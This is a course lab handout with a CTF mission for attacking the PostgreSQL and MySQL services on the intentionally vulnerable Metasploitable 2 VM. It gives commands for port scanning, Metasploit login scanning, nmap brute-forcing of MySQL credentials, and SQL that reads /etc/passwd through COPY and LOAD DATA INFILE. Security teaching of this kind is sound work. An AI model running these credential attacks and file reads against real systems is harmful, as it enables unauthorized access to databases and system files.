# ACIT 4630 - Lab 3: Attacking Databases on Metasploitable 2

## Lab Instructions

### Scanning for Open Ports

Run the following command to scan for services and ports on the Metasploitable 2 VM:

```sh
sudo nmap -sV <Metasploitable2_VM_IP>
```

Identify the open ports for PostgreSQL (port 5432) and MySQL (port 3306).
Run a more detailed scan on the database ports: (OPTIONAL)

```sh
sudo nmap -T5 --script='all' -p5432,3306 <Metasploitable2_VM_IP>
```

### Attack PostgreSQL Database

Start Metasploit in Kali Linux:

```sh
msfconsole
```

Search for the PostgreSQL login scanner:

```sh
search scanner postgres login
```

Set the necessary variables:

- Set `RHOSTS` to your `<Metasploitable2_VM_IP>`.
- Set `ANONYMOUS_LOGIN` to `true` or `1`.

Run the exploit to find working credentials: `run` or `exploit`
After discovering the credentials, log in to the PostgreSQL database:

```sh
psql -h <Metasploitable2_VM_IP> -U <Username> -d <DB Name>
```

Once inside the PostgreSQL shell, retrieve the system's hashed password file as below:

1. First, we need to create a Table:

   ```sql
   CREATE TABLE passwd_data (line TEXT);
   ```

2. Then we need to copy the file to out table:

   ```sql
   COPY passwd_data FROM '/etc/passwd';
   ```

3. We read the whole table:

   ```sql
   SELECT * from passwd_data;
   ```

### Attack MySQL Database

Run the following Nmap command to brute force MySQL credentials:

```sh
sudo nmap -T1 -d --script="mysql-brute" -p3306 <Metasploitable2_VM_IP>
```

**Note**: If no credentials are found, try again OR reboot the Metasploitable 2 VM.
After obtaining credentials, log in to MySQL:

```sh
mysql -h <Metasploitable2_VM_IP> -u <Username found> -p --skip-ssl
```

In the MySQL shell, dump the password file after creating a new table:

```sql
CREATE TABLE newtable(LINE TEXT);
LOAD DATA INFILE '/etc/passwd' INTO TABLE newtable;
```

Read the `newtable` to see the content of the `/etc/passwd` file written there.

---

## **Mission 3 – The Double Vault Heist** 🗝️💾

> *Two vaults. Two worlds. Both hold secrets… but only the worthy will open them.*

Somewhere deep inside our target’s infrastructure lie **two critical intel drops** — one locked away in the **PostgreSQL vault**, the other hidden in the shadows of the **MySQL vault**.
Your objective is simple: **capture both mandatory flags** before the clock runs out.

But beware: rumors speak of a **third, bonus vault** inside MySQL — an **unlisted stash** placed there by the old operatives.
It’s not required for mission completion…
…but those who claim it will earn **extra glory, higher points, and almost certain recruitment** to the elite **BCIT CTF Strike Team**.

**Objectives:**

1. **PostgreSQL Flag** – Hidden in schema `intel`, table `flags`.
2. **MySQL Flag** – Location unknown… your recon will tell.
3. **Bonus Flag (MySQL)** – Invisible to the untrained eye. Finding it will set you apart.

**Flag Format:**

```txt
BCIT{something_here}
```

**Rules of Engagement:**

- The two main flags are mandatory for mission completion.
- The bonus flag is optional but **highly valuable** for leaderboard ranking.
- No brute-forcing passwords — think like a cyber-sleuth, not a wrecking ball.
- Document your steps: **evidence matters.**

### 🔎 **Hint for the PostgreSQL Vault**

> *“Not all doors have names on them… sometimes you must first ask the gatekeeper what tables exist in the land. Once you know their names, you may read from the one that whispers secrets of **intel**.”*

💡 Practical nudge:

- Start by listing all tables you have access to.
- Then, investigate the one that belongs to schema **`intel`** — it may hold more than just rows of data.

That way, they’ll naturally run something like:

```sql
SELECT * FROM pg_tables;
```

---

### Submission For Lab 3

- Add these screenshots to your report:
  - Result of msfconsole postgres exploit
  - Result of entering postgres database and retrieving the passwd file
  - Result of nmap script where you got credentials of mysql
  - Result of entering mysql database queries and retrieving the passwd file
- Mandatory Mission 3 parts (1st and 2nd flags) with documented evidence.
